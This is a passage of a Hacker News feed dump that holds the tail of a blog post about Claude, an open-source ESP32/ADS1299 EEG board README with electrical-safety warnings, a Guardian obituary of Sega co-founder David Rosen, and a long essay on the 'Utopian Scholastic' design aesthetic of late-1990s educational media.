    &lt;p&gt;Didn't the year involve a year's worth of learning, and if you could really go back without ANY of that experience, could Claude have really done it in an hour? I'm doubtful. “It” was still unknown, undiscovered.&lt;/p&gt;
    &lt;p&gt;And even if it COULD do it in an hour, I'm presuming “It” is still something that will require a lot of ops work to get going and continually be maintained? And sure the Claude Cloud Army could eventually be built out to handle that too I suppose, but ... anyway.&lt;/p&gt;
    &lt;p&gt;I don't have a great zinger here to wrap up with. Claude?&lt;/p&gt;
    &lt;p&gt;Wry acceptance:&lt;/p&gt;
    &lt;p&gt;- “Anyway. Back to my one turtle. It's not much, but it's honest work.”&lt;/p&gt;
    &lt;p&gt;Welp, that sucked. Ta-ta for now!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://clabs.org/blog/CalibratingMyTurtle"/><published>2026-01-05T17:41:17+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46502051</id><title>Show HN: Open-Source 8-Ch BCI Board (ESP32 and ADS1299 and OpenBCI GUI)</title><updated>2026-01-05T19:37:51.526441+00:00</updated><content>&lt;doc fingerprint="bc500c9c4be7210c"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;High-precision 8-channel biosensing board designed for EEG, EMG, ECG, and Brain Computer Interface (BCI) research applications&lt;/head&gt;
    &lt;p&gt;www.cerelog.com and Product Page: Here&lt;/p&gt;
    &lt;p&gt;Need Help or have a question? Discord Chat Community&lt;/p&gt;
    &lt;p&gt;Open Source Firmware, Software &amp;amp; Schematic included on this page&lt;/p&gt;
    &lt;p&gt;Contact: simon@cerelog.com&lt;/p&gt;
    &lt;p&gt;Need Help or have a question? Discord Chat Community&lt;/p&gt;
    &lt;p&gt;Product Page: Here&lt;/p&gt;
    &lt;p&gt;Product Usage Guide : Here and See Instructions file above for device usage&lt;/p&gt;
    &lt;p&gt;Video Product Overview: Here&lt;/p&gt;
    &lt;head rend="h2"&gt;Compatable with OpenBCI Gui (Custom fork) via **Lab Streaming Layer (LSL) ** protocol (What is LSL?)&lt;/head&gt;
    &lt;p&gt;Setup instructions and LSL Custom Python connection script : Here&lt;/p&gt;
    &lt;p&gt;A modified OpenBCI Gui has been forked above so you can visualize data easily and stream to other platforms. This works with it's LSL streaming capability via a special python script (in link above)!&lt;/p&gt;
    &lt;p&gt;ESP-EEG’s Python client software can stream data via the standard neuroscience software communication protocol Lab Streaming Layer. This means you can stream directly to your favorite neuroscience software or Matlab running on your laptop or remote computers, record data streams, and integrate ESP-EEG's data with other data streams.&lt;/p&gt;
    &lt;p&gt;Instructions on how to collect data from device with Brainflow API custom instance: Here&lt;/p&gt;
    &lt;p&gt;and&lt;/p&gt;
    &lt;p&gt;Custom instance of Brainflow Repo: Here for collecting data with the device.&lt;/p&gt;
    &lt;p&gt;Note: Test script to quickly view plot and aquire data -&amp;gt; Run 'Shared_brainflow-cerelog/python_package/cerelog_tests/filtered_plot.py' from in above repo. (Must download and run with full Brainflow instance to use)&lt;/p&gt;
    &lt;p&gt;Unlike many consumer EEG devices that use "open-loop" or passive grounding strategies, the ESP EEG implements a True Closed-Loop Active Bias (Drive Right Leg).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Problem: Many competitors leave the bias feedback loop open, rendering the noise cancellation ineffective against movement artifacts and 50/60Hz hum. Their bias pin effectively becomes the average of the supply rails and acts as a ground on their device making the bias pin not function as effectively intended on the ADS1299 datasheet.&lt;/item&gt;
      &lt;item&gt;Our Solution: We utilize the full capability of the ADS1299 to measure the common-mode signal, invert it, and actively drive it back into the body.&lt;/item&gt;
      &lt;item&gt;The Result: A significantly lower noise floor and fewer artifacts, allowing for research-grade data capture even in non-shielded environments.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;View hardware folder for device schematic&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Status LED (GPIO 17): &lt;list rend="ul"&gt;&lt;item&gt;🟢 Solid On: Firmware loaded, ready to stream.&lt;/item&gt;&lt;item&gt;⚫ Off: Board not powered or boot failure.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Battery LED: &lt;list rend="ul"&gt;&lt;item&gt;🔴 Red: Charging.&lt;/item&gt;&lt;item&gt;🟢 Green: Fully Charged.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Battery Connector: JST-PH 2.0mm (Red = +, Black = -). Supports 3.7V LiPo.&lt;/item&gt;
      &lt;item&gt;Electrodes: Standard touch-proof headers. (Pins 1-8 = Signal, SRB1 = Reference).&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Feature&lt;/cell&gt;
        &lt;cell role="head"&gt;Specification&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;ADC&lt;/cell&gt;
        &lt;cell&gt;Texas Instruments ADS1299 (24-bit, Research Grade)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Channels&lt;/cell&gt;
        &lt;cell&gt;8 Differential Channels + 1 Active Bias (Noise Cancellation)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Sample Rate&lt;/cell&gt;
        &lt;cell&gt;250 SPS (Default)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Processor&lt;/cell&gt;
        &lt;cell&gt;ESP32-WROOM-DA (Dual Core, WiFi/BT capable)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Connectivity&lt;/cell&gt;
        &lt;cell&gt;USB-C (Data/Power) &amp;amp; WiFi/Bluetooth (Hardware Ready)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Montage&lt;/cell&gt;
        &lt;cell&gt;Referential (SRB1 = Ref) by default. Configurable to Sequential. See firmware folder for more information&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;View firmware folder for firmware and modification instructions&lt;/p&gt;
    &lt;p&gt;NON-ISOLATED DEVICE: BATTERY OPERATION REQUIRED&lt;/p&gt;
    &lt;p&gt;This device does not contain galvanic isolation circuitry. To ensure user safety and prevent ground loops:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;ALWAYS use this device with a laptop running on BATTERY POWER.&lt;/item&gt;
      &lt;item&gt;NEVER connect this device to a computer that is plugged into a wall outlet (Mains Power).&lt;/item&gt;
      &lt;item&gt;NEVER use this device on a desktop computer.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Failure to follow these instructions introduces a risk of electric shock in the event of a mains surge and will significantly degrade signal quality due to ground noise.&lt;/p&gt;
    &lt;p&gt;This product is intended for research, engineering, and educational purposes only. It is not a medical device and has not been evaluated by the FDA. The product is not UL or FCC certified.&lt;/p&gt;
    &lt;p&gt;This evaluation board/kit is intended for use for ENGINEERING DEVELOPMENT, DEMONSTRATION, OR EVALUATION PURPOSES ONLY and is not considered by Cerelog Inc. to be a finished end-product fit for general consumer use.&lt;/p&gt;
    &lt;p&gt;We expressly disclaim any liability whatsoever for any direct, indirect, consequential, incidental or special damages, including, without limitation, lost revenues, lost profits, losses resulting from business interruption or loss of data, arising from the use of this product.&lt;/p&gt;
    &lt;p&gt;Only plug this device into a computer running off of battery power such as a Laptop running on its own battery supply or a raspberry pi powered by a portable battery bank. Do not connect to a mains powered device such as a PC because it is not isolated in the event of a power surge.&lt;/p&gt;
    &lt;p&gt;Cerelog Inc. assumes no liability for the performance, suitability, or use of any third-party products linked or recommended on this website.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/Cerelog-ESP-EEG/ESP-EEG"/><published>2026-01-05T17:46:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46502239</id><title>Sega co-founder David Rosen dies aged 95</title><updated>2026-01-05T19:37:51.326843+00:00</updated><content>&lt;doc fingerprint="66aea519a4e5ff7d"&gt;
  &lt;main&gt;
    &lt;p&gt;It is difficult to think of a more influential figure in the arcade game industry than David Rosen, who has died aged 95. The co-founder of Sega, who remained a director of the company until 1996, was instrumental in the birth and rise of the video game business in Japan, and in the 1980s and 90s oversaw the establishment of Sega of America and the huge success of the Mega Drive console.&lt;/p&gt;
    &lt;p&gt;As a US Air Force pilot during the Korean war, Rosen found himself stationed in Japan, and once the conflict was over, he stayed on, intrigued by the country and seeing possibilities in its recovering economy. In 1954 he set up Rosen Enterprises and noticing that Japanese civilians now required an increasing number of new ID cards he started importing photo booths from the US to answer the demand. From here he expanded to pinball tables and other coin-operated machines, importing them for installation in shops, restaurants and cinemas. In 1965, he merged the company with another importer, Nihon Goraku Bussan, whose coin-op business Service Games was shortened to Sega for the new venture.&lt;/p&gt;
    &lt;p&gt;For the next 15 years, Sega innovated in the arcade sector, switching from importing games to designing its own, and moving on from jukeboxes and pinball tables to electromechanical arcade games such as the submarine shooting sim Periscope and, in 1972, Killer Shark, a shark hunting game which would briefly feature in Jaws. Sega also began to set up its own arcades allowing the company close control over every facet of its business.&lt;/p&gt;
    &lt;p&gt;One of Rosen’s great skills was in finding and employing people who instinctively understood where games were heading. In 1979, he spotted rising industry star Hayao Nakayama, director of Esco Trading, another arcade company. As Rosen explained to me in 2013: “Nakayama was very active as a distributor at the time – he was someone I felt was very astute and was quick to adapt to what was happening in the industry, and I wanted him – we did it via an acquisition of his company. By assimilation, we had him and the staff join us.” Nakayama would go on to be the president of Sega Japan during its heyday from 1983 to 1998.&lt;/p&gt;
    &lt;p&gt;During this time, Sega rose from a competitor alongside fellow arcade manufacturers Namco, Capcom, Taito and Konami, to an industry leader. Its sleek, stylish coin-ops of the 1980s – Outrun, Space Harrier and AfterBurner – changed the image of arcades from nerdy hideouts to cool aspirational hangouts, while 1990s titles Virtua Racing and Virtua Fighter established the company as a technological powerhouse.&lt;/p&gt;
    &lt;p&gt;From the late-1970s, Rosen pursued a new market: home TV games. He encounter a major rival, Nintendo, which dominated with its Color TV-Game console, and later the Nintendo Entertainment System. When Rosen returned to the US in the early 1980s, he was determined to take a slice of the global console industry from his Kyoto-based competitor. “Nintendo was responsible for the revival of the home console market after the Atari collapse of 1983,” he told me. “We wanted to see if we could make a device that would be competitive. Unfortunately our first attempt failed to compete. It was just made up of off the shelf parts, it wasn’t until 1986 that we brought out the Master System …”&lt;/p&gt;
    &lt;p&gt;This machine would struggle in the US but was huge in Europe and South America, and Rosen spotted a niche. While Nintendo was all about family entertainment, the titles doing well on the Master System were teen-focused brawlers, such as Golden Axe and Shinobi. When it came to release the new Sega Mega Drive console in Japan in 1988, Rosen insisted on changing its name to Genesis for the US launch, emphasising a new beginning and a more mature outlook. He also brought in Michael Katz an experienced exec from Mattel and early console company Coleco.&lt;/p&gt;
    &lt;p&gt;“We were up against the wall in terms of time,” he said. “I had known Michael from some of the other endeavours he was involved in, he had all this experience from Coleco and he certainly knew the players. I thought he could help launch the product and at the same time bring structure to the company, which he did.” Spurred on by Rosen’s vision, Katz marketed the Genesis as a games console for teenagers, not children, using TV ads which combined video game visuals with flashing images and rock music and the immortal phrase: Genesis does what Nintendon’t. When Tom Kalinske took over as CEO Sega of America in 1990, he oversaw a new series of equally famous ads which almost always ended with someone screaming “Sega!”&lt;/p&gt;
    &lt;p&gt;Rosen would stay active in the company in various senior roles until retiring in 1996. Although Sega’s home console business would falter in this period due to the rise of the Sony PlayStation, the company’s arcade supremacy remained for the rest of the decade. I spoke to him in 2013 while writing the book Sega Mega Drive Collected Works. As a lifelong Sega fan, my hour-long chat with him that day was a career highlight. He talked fondly about his time in Japan, the people he worked with and his journey through the industry. He told me with considerable glee that while out and about in his home town of Los Angeles, strangers would still shout ‘Sega!” at him when passing on the street.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.theguardian.com/games/2026/jan/05/sega-co-founder-david-rosen-dies"/><published>2026-01-05T18:00:32+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46502652</id><title>Utopian Scholastic</title><updated>2026-01-05T19:37:50.866966+00:00</updated><content>&lt;doc fingerprint="3f28d3dd2922c909"&gt;
  &lt;main&gt;&lt;quote&gt;Warning: this post&lt;del&gt;has a lot of&lt;/del&gt;is positively dripping with of media. Please pardon the larger-than-usual webpage size as I geek out, reminisce, and stand on a little soapbox in my little corner of the Internet.&lt;/quote&gt;&lt;p&gt;Anyone browsing the stacks of a public library mirror around the turn of the millennium would eventually come across the music-and-software section. Brightly colored photos, generally divorced from their original backgrounds were spliced into abstract arrangement along with bold text and wrapped in a plastic clamshell. Sometimes the CDs were in the original box, other times in a library-specific distribution with a text label that required a child to open each case to see see if the CD label suggested it was something interesting. I was just tall enough at the time to idly flick through the boxes, crack open audio book box sets, and flip through the index card racks that would soon be on their way out.&lt;/p&gt;&lt;p&gt;I can still smell the stale air in that library. The sublime 80s portico also served as the backdrop of the first nightmare that I could ever recall during the day. It was a strange and liminal space that I can still meander in my mind. I left thousands of my fingerprints on the topographical globe and corresponding mural of a wall map. I rifled through the DK Eyewitness books as I would later rifle through the Childcraft encyclopedias in my kindergarten class. I would slip books with striking covers and surely obsolete CD-ROMs into my mother's brown library bag (a bag I still have and cherish to this day) on the way to check out.&lt;/p&gt;&lt;p&gt;This is, of course, where I say the library was the catalyst of my book hoarding and general love of the pursuit of knowledge. More than that, the trips to the library burned a very specific sensibility into my mind. While my parents saw the trips as an inexpensive way to pass the time and find whatever software they needed, it was for me a very potent exposure to a fleeting human (or maybe American?) optimism at the dawn of the Internet.&lt;/p&gt;&lt;p&gt;Utopian Scholastic, as described by CARI mirror, is a visual visual style widespread in the late 1990s and early-2000s which features stock image collages in often abstract, education-leaning compositions. A relatively peaceful close of a chaotic century was at hand. There was a vast millennium of human history to reflect on. There was a technology being rapidly deployed that could bring the world closer together. Commercial design, especially in educational materials was imbued with this academic detachment and techno-positivity. Utopian Scholastic writes from place at the end of history mirror, but of course these years were only a vacation from history.&lt;/p&gt;&lt;p&gt;Toys "R" Us' Geoffrey the Giraffe mascot received a photorealistic incarnation around the Peak of Utopian Scholastic design before deciding to live in fantasy again&lt;/p&gt;&lt;p&gt;But before the end of the end of time there was, of course, the beginning of the end of time. And it seems to have begun with the collision of information post-scarcity and the belief in self-guided learning. Computer-aided design and typesetting would invite a generation of kids (and adults!) to explore the world through a new medium.&lt;/p&gt;&lt;p&gt;The potential that interactive media could have on education was evident well before the Internet came to prominence. In Douglas Adams' 1990 film Hyperland mirror (Watch Hyperland), the clean, white backgrounds and moving images that would come to define Utopian Scholastic are already present.&lt;/p&gt;&lt;p&gt;Computer-user Adams is perpetually rearranging thumbnails of knowledge, digging deeper and exploring in a manner so clearly prescient to anyone who has ever gone on a Wikipedia bender.&lt;/p&gt;&lt;p&gt;The closing sequence, with its demoscene-style flying CGI, surely influenced the absolute pinnacle of Utopian Scholastic design, the DK Eyewitness documentary series (1995-1998) mirror intro.&lt;/p&gt;&lt;p&gt;Hyperland scene [Extended version with sound]&lt;/p&gt;&lt;p&gt;Eyewitness intro [Extended version in case you couldn't hear the theme music instantly]&lt;/p&gt;&lt;p&gt;It's an appropriate connection given that DK had been producing the Eyewitness series of eye-popping, but information-dense hardbacks since 1988 mirror). Translating the natural history museum into print, Eyewitness books read more like a cabinet of curiosity than a textbook. In the same manner that the cabinet of curiosity presented a curated assortment of objects from across the domain of natural philosophy (excellent PDR post on this! mirror) to showcase the beauty and wonder of the world, so the Eyewitness series gathers photographs and artwork often divorced of their original context and mixes them together to explore a concept dynamically.&lt;/p&gt;&lt;p&gt;Side note: In case it isn't obvious, I love these books. I have gathered more than 30 of them just by sifting through used book stores (and trying to remember which ones I already have). I've also fallen in love with the gorgeous, but much more dry and taxonomically organized Welcome to the Museum mirror series. I will, however, never forgive Welcome to the Museum producers Big Picture Press for having inconsistent text alignment on their bindings!!&lt;/p&gt;&lt;p&gt;The same stark white background of these books and the non-linear exploration of each topic would become the obvious choice for interactive educational material of the 1990s. In each of these cases, it's the connections between each topic that drives the reader through forking paths of ideas. It's okay to skip whole pages when browsing a topic. The agency and autonomy in the learning process is what I find so compelling in these books. This linking of concepts into an abstract, mental map that becomes personal to each person. It's a kind of dialogue. Like what *Hyperland* predicted for human computer interaction. Artists and software developers of the 90s and 00s delivered on that prediction in such a visually striking way.&lt;/p&gt;&lt;p&gt;Around the same time as I was laying on the dirty, patterned floor of the Midpointe Middletown library and noisily crunching audiobook cassette tapes back into their form-fitting plastic enclosures, I was regularly going to a babysitter. It was probably 1998/99 and Rocko's Modern Life reruns, serving as a potent and surreal foil for Utopian Scholastic media, were on the TV. One of my strongest memories of my time staying there was watching quietly as the sitter (who was genuinely loving and amazing even if she let us watch cartoons half the day!) conversed with a jester in a 2.5D castle maze. Trivia questions, the answers to which I certainly didn't know if I could even read the words, led further and further in a strange, interactive journey of academic diversion. It would only be this year (2025!) that I would learn that the game was the Encarta Mindmaze mirror, part of the Microsoft Encarta encyclopedia.&lt;/p&gt;&lt;p&gt;Quality content from Microsoft? It used to exist! It's true!&lt;/p&gt;&lt;p&gt;The Mindmaze, more than the fluorescent, side-scrolling tropical fish screensaver or the television, captivated me due to its user-driven meandering. (Hmm I guess Blue Prince scratches that same maze-exploring itch). Like so many other kids of that era, I would go home and spend hours on the family Windows computer and just *look around*. Windows 95, unlike the modern iterations that treat users like an illiterate moron, presented hundreds of settings through a vast tree of interesting dialog boxes. It was no matter that I was too young to comprehend the implications of the settings-- I wasn't foolhardy enough to toy with the fragile family PC of the 90s --the fact that I could see new words in context was an education of its own.&lt;/p&gt;&lt;p&gt;The interactive media corpus built on top of the click-heavy, non-linear framework of the 90s Windows environment (not to mention the Macintosh's prescient HyperCard mirror software) was vast. I had an incredibly difficult time narrowing down the representative pieces of Utopian Scholastic education and home office software to share here. It feels like nearly everything released from 1995 to 2002 echoes the same photo-forward styling with only a spattering of new age stylizing.&lt;/p&gt;&lt;p&gt;While Dorling Kindersley was obviously at the vanguard, I've come across many other examples of books and print media from my collection that easily fall into the Utopian Scholastic umbrella.&lt;/p&gt;&lt;p&gt;I'd personally like to go out on a limb and say the I Spy Fantasy book speaks to me in a very Utopian (though maybe not wholly scholastic) manner. And, yeah, maybe I just wanted to remind people how cool the toy block city is. Mark my words I will make an OpenTTD mirror texture pack based on this some day!&lt;/p&gt;&lt;p&gt;Ha ha! I got this far without talking about Myst mirror. I cannot think of a piece of period software that better reflects on the solitary journey of investigation. While the game has a potent eeriness, the user is (nearly) detached from the events: an observer and wanderer foremost. I'm ashamed to say that despite having the entire series I've only played an hour or so of Myst in scattered bursts throughout my life. I'm almost afraid to finish it in case the plot does not live up to the magical atmosphere in the first few scenes.&lt;/p&gt;&lt;p&gt;Myst, of course, launched a whole category of media-- immersive puzzle solving games. A genre of entering a memory palace mirror dreamed up by the games author. It's perhaps that potency of travelling through three-dimensional space (even if by digital illusion) that places the story (and the knowledge associated with it) so firmly in the players mind.&lt;/p&gt;&lt;p&gt;As exemplified by Myst, the exploration of the Utopian Scholastic era was a solitary endeavor. While many dining chairs could inevitably crowd around a computer desk, the experience was fundamentally between the computer user and the publisher of the software. While threshold for creating software could be quite low and BBS's abounded with quirky, outrageous, or totally explicit content, the software that had the greatest distribution was sanitized and generally appropriate to run on a library computer. Just like a physical encyclopedia, the CD-ROM manifestation takes time to compile and disseminate. It could be quickly out of date. It couldn't easily ingest valid user contributions. It could have the biases of the editor. But it also couldn't be deleted overnight by the incoming political regime.&lt;/p&gt;&lt;p&gt;This was an age before the Internet had wide adoption by the general public. Only with the spread of broadband n the early 2000's would the Internet gain the same character of vivid imagery and complex narratives as boxed software. By then, the world had changed and development of blogging and social media (see the phenomenal Cybercultural series on the evolution of the Internet in the dotcom era mirror) fundamentally shifted what information was available to someone logging onto their computer. The democratization of publishing and instantaneous content transmission removed the editorial filter on computer media up to that point. But the Internet, the culmination of the Utopian Scholastic ideal of a perfectly connected world open to anyone who wanted to explore, would prove to be its downfall.&lt;/p&gt;&lt;quote&gt;!!! Stop here if you were just here for the pictures. Beyond this point is a long rant followed by a measured dose of hopium. !!!&lt;/quote&gt;&lt;p&gt;One can think of Utopian Scholastic as the artistic representation of information post-scarcity. It's the Internet of the Library that could pull from any book from anywhere in the world. But of course the corpus of public-library-appropriate books is an incomplete view of humanity. And it surely isn't going to make any money.&lt;/p&gt;&lt;p&gt;The transition out of Utopian Scholastic design into the age of Frutiger Aero mirror (CARI mirror) was fairly gentle. Flash website design often maintained a playful element even if photo realism would fall by the wayside. Microsoft was altruistic enough to include Space Cadet Pinball without ads or a subscription in Windows XP. Apple's interfaces on the iPod Touch and OSX Leopard were bright and covered in gradients. It was still an age of experimentation. But for many users, the Internet was shrinking to just a few websites: a search engine with increasingly less click-through and social media. With the advent of smartphones the Internet would begin to be filtered through the constraints of an app.&lt;/p&gt;&lt;p&gt;I'm trying my damnedest here to be concise so I'll utilize a metaphor. In the mid 2010s, during my internship at Intuit. I witnessed firsthand how the UI designers for TurboTax were honing user interface design as a weapon. In the study, they would watch a user's mouse move around a demo layout. The goal was to maximize the number of purchases of an upgrade regardless of the user's situation. The UI was designed to be intentionally misleading. By utilizing human fear and hesitation, they would swindle people into clicking for TurboTax Deluxe. They didn't need Deluxe! They didn't even need to pay anything! Filing your fucking taxes online is free for half the US! This is the way that the dream of an Internet for the people was crushed.&lt;/p&gt;&lt;p&gt;As far as I'm concerned, this broached an era best represented by Corporate Memphis mirror. The disingenuous minimalist design is a reflection the minimization of user agency. The design centers around presenting the flat user stories as how the user should feel and act. The invitation to explore and grow is gone. With each tweak to a social media algorithm or mandatory software update the user is cast into the role of a passive consumer, a data point on an engagement graph. The Internet was not unique in this bait-and-switch of profit maximization. One can look to cable television and Clear Channel radio to see what slop people are expected to consume.&lt;/p&gt;&lt;p&gt;Note: This is where I'd put a picutre of Corporate Memphis but I refuse because I can't fucking stand it&lt;/p&gt;&lt;p&gt;In Douglas Adam's *Hyperland*, the user is in control, the software agent is subject to their whims. In modern UI, search engine, and large language model (LLM) interface design, the user is led. At the very least, the user is given a constrained view of the world that fits into some company's monetization regime. Even for inquiring minds, the instant answers provided by knowledge engines aren't meaningfully retained. A 2025 MIT study mirror compared topic retention between essay-writers who used an LLM, a search, engine or neither. It suggests the learning was "not internally integrated, likely due to outsourced cognitive processing to the LLM." The same study found a decided echo-chamber effect in which the unique perspectives of individuals were suppressed in favor of the canned "correct" answer. Much grumbling has been made about the post-truth age. But it often feels like the world has moved into a post-learning age.&lt;/p&gt;&lt;p&gt;I'm drawn to Utopian Scholastic because it represents a sort of digital incarnation of the archetypal lone antiquarian pouring over countless tomes in a high tower; sequestered from the superficial world below. The knowledge within a childrens' encyclopedia may not be so arcane as that of the alchemist, but the revelations of the wonders of the world are still personal. And like the path of the alchemist, the focus in this isolated, pre-social-media world, is primarily inward.&lt;/p&gt;&lt;p&gt;Find me a medieval monk who could dream up such hells and ecstasies as could be found on the early web&lt;/p&gt;&lt;p&gt;I resonate with this caricature even as I know the path of the alchemist terminates in the impossible. Growing up as an only child with more existential curiosity than my peers, I learned to love my solitude among the woods, my family's books, and a hand-me-down PC. Because of this, or, perhaps because of some uncurable habit of chronic introspection, I've always felt somewhat aloof from modern society. Indeed, it never was as perfect as described in turn-of-the-millennium PC encyclopedias. History kept marching on and it really wasn't pretty.&lt;/p&gt;&lt;p&gt;I have had a generally fantastic life. I'm even pretty decent at socializing when I stop being condescending. But the growing awareness of human caused destruction has definitely clouded my outlook. I've considered myself a misanthropist for much of my life. Sometimes it takes a singular book or a video game to get me to pick one side or the other.&lt;/p&gt;&lt;quote&gt;SPOILERS! Maybe don't read this section if you haven't played both the Talos Principle and the Talos Principle 2. I promise this is the last quote block in this post.&lt;/quote&gt;&lt;p&gt;The Talos Principle mirror is a visually stunning puzzle series taking place after a human extinction event. The protagonist explores the concept free will through solitary interactions with puzzles and classical literature. The player may ultimately choose their ending to the game, but the main ending is one in which the player seeks independence of thought. It's Portal mirror) dressed in a toga, the Utopian Scholastic ideal of technology, solitary exploration, and thought-provoking erudition.&lt;/p&gt;&lt;p&gt;The sequel mirror is framed differently. The player is immediately put into a society of diverse (and sometimes insufferable!) characters. I found myself disappointed that I sometimes had to follow along the plot line with people that were actively challenging my beliefs. (I really wanted to chuck Byron off a cliff, okay) But the game provided me with beautiful meanderings through a pristine biomes spinkled with beautiful brutalist megaliths. And the forking path of choices in the game does allow for a more pessimistic view toward humanity even if the gradient was pretty abrupt. I ended up with an ending. It wasn't the "best" one, but it left me with the thought: without humans, who is there to appreciate the splendor of the universe? How can we throw away our DNA: the triumph (or at least the brave experiment) of gaia's serendipitous evolution? Who else could we entrust to seeding life throughout the universe to protect against the destructive whims of an unfeeling, undiscriminating universe?"&lt;/p&gt;&lt;p&gt;Utopian Scholastic and its sabbatical from history is places humans as observers within the universe rather than active members in it. It lacks the call to action that is demanded by science and art. Of course, Utopian Scholastic content is toned down for kids-- it's challenging to put a memento mori on an elementary school computer. And even meek suggestions for action can be construed as some kind of biased, political motive. On a more practical level, the existential problems facing humanity are hard! Graphic design's goal isn't really to predict the future or explain the meaning of life. Yet, it's a branch of the potent world of art. And the invulnerable, stoic optimism exuded by Utopian Scholastic contrasts harshly with the crooked march of human progress. Knowledge without context of life's fragility is bound to lead to inaction.&lt;/p&gt;Some of my pessimism, so antithetical in the bright-eyed days of the late 90s, is derived from the disconnect between the utopia presented in virtual encyclopedias and the self-sabotaging society I would come to enter. Our ability to comprehend the scope of our actions is (probably) unique in all eons in the history of life. Yet we refuse to believe anything that would challenge the mandate of unbounded capital growth. This superficial introversion fails to incorporate mankind's place in the comsos into it's reason for existing1. Much like an alchemist seeking the philosopher's stone without first righting themselves within the supernatural world, materialistic human progress ignores our precious capacity for higher thought.&lt;p&gt;But it's nihilistic, meaningless to surrender to the future prescribed by corporate defeatism. We don't have to accept our doom brought on by ourselves or the machinations of the universe. Humans are, to our current understanding, unique in the world by the power of our cognition. While we are often agents of hate and destruction, we can be authors of creation, engineers of mending, restoration, and preservation. We have the power of hope and resilience. It's fruitless to squirrel ourselves away and refuse to face the place we occupy in existence. We must be invested in the world that we live in. The insights we discover in the erudition of our daily lives must not be discounted. Our gift of cognition must be respected in order for it to develop. And if we want to respect our cognition, it must be put into practice.&lt;/p&gt;&lt;p&gt;I'm grateful to have found this amended idealism in the dusty outskirt of the web that I reside. It's not the blind techno-optimism of an Internet that is obsessed with sales figures. It's more in line with DIY sensibilities and solar punk mirror. Rejecting the corporate model of a captive Internet, individuals can be empowered to find the communities that foster the joy of being human. They can be encouraged to grow and create. They can take pride in work that came about through their own effort. Wikipedia is a glorious bastion of human-centric knowledge aggregation mirror in an era when Encarta's Microsoft is shilling a genie in the form of AI. Anna's Archive provides a means of preserving the corpus of human knowledge without relying on an entity that is subject to a bottom line or the whims of their leaders. Personal blogs and community forums continue to document unique, individual experiences and provide guidance to others without seeking compensation or fame. The dream of an Internet incorporating all of humanity's cognition for the good of all people is not dead. It's just sick. The tools to power a healthier online space are available, but they aren't owned by shareholders.&lt;/p&gt;&lt;p&gt;The Utopian Scholastic approach of human-centric education lives on today. Interactive learning is more powerful than ever mirror. Games like Civilization, Crusader Kings, Kerbel Space Program, and everything Zachtronics put out, offer opportunities for essentially academic learning alongside engaging gameplay. But even games that aren't explicitly full of historical lore or science provide their own mental stimulation through open-endedness: Minecraft (though open source Luanti mirror is certainly less on-rails these days) and tycoon games. Others reveal mathematical beauty like the gambling-adjacent Balatro. Still others are thought-provoking or meaningful in the manner of a novel: The Stanley Parable, Chants of Senaar, or Gone Home. It'd be tiresome to list all of the works of computer media I can think of which strike up a dialogue with the player, encourage creativity. and inspire joie de vivre that can translate into the physical world. Time spent at the computer can be meaningful. The user just needs agency in that interaction.&lt;/p&gt;&lt;p&gt;Beyond the stripped-down approach I've taken to my online life, I've done my best to foster a sense of curiosity in my kid. I've gotten him his own topographical globe reminiscent of the one I spent so much time with at the Middletown library so many years ago. Our bookshelves bear a 1980s-vintage Childcraft encyclopedia collection and as many Eyewitness books as reason allows. I don't know if these will have the same effect on him as they had on me. And while I often can't help pulling one from the shelf and reading with him, I want him to develop the fascination naturally. I do believe independent thought is still possible in the third decade of this millenium.&lt;/p&gt;&lt;p&gt;At the time of this writing, we're closing out 2025. A quarter of a century has passed from the peak of Utopian Scholastic design and the not-quite end of history. I find renewed-but-augmented hope for technology as a beneficial, uniting force. I believe that the challenges we face on the planet can be overcome if we are first willing to accept that we are capable. We don't require the intercession of some messianic AGI that would ultimately maintain existing social inequality anyway. Human dignity demands that we acknowledge our ability, even by means of play, to approach intricate problems and overcome incredible challenges. People are at their best when they are given the chance to explore, experiment, be wrong, and learn. Only then can we prove our resilience as a species and preserve this noble accident of a biosphere.&lt;/p&gt;&lt;p&gt;Thank you for hanging on through this blog post. Best wishes to you in whatever era you've come across this.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
